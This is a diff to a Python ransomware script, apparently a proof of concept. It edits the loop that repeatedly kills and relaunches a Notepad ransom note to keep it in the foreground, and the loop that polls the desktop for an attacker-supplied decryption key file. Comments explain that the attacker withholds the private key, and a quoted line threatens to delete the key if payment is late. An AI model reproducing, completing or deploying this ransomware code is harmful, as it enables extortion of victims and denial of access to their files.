@@ -157,12 +157,11 @@ If the payment is not made on time, the decryption key will be deleted and you w
             time.sleep(0.1)
             top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
             if top_window != 'RANSOM_NOTE - Notepad':
-                print('[!] Ransom note is not the top window - kill and create process again.', end="\r", flush=True)  # DEBUG
                 # Kill the ransom note process so we can open it again and make sure it is in the foreground.
                 time.sleep(0.1)
                 ransom.kill()
-                # Open the ransom note.
                 time.sleep(0.1)
+                # Open the ransom note.
                 ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
             # Sleep for 10 seconds.
             time.sleep(10)
@@ -176,7 +175,6 @@ If the payment is not made on time, the decryption key will be deleted and you w
         print('[!] Scan started.')  # DEBUG
         while True:
             try:
-                print('[!] Attempting to start decryption.', end="\r", flush=True)  # DEBUG
                 # The ATTACKER decrypts the Fernet symmetric key on their machine and then puts the un-encrypted Fernet-
                 # -key in this file and sends it in a email to the victim. They then put this on the desktop and it will be-
                 # -used to un-encrypt the system. WE DO NOT GIVE THEM THE PRIVATE ASSYEMTRIC KEY.
@@ -192,7 +190,7 @@ If the payment is not made on time, the decryption key will be deleted and you w
                 pass
             # Scan the desktop for the file every 10 seconds.
             time.sleep(10)  # DEBUG
-            print('[!] Scanning for PUT_ME_ON_DESKTOP.txt')  # DEBUG
+            print('[!] Scanning for PUT_ME_ON_DESKTOP.txt\r', end="")  # DEBUG
             # 10 seconds is just proof of concept. Real example: Sleep ~ 3 mins
             # secs = 60
             # mins = 3
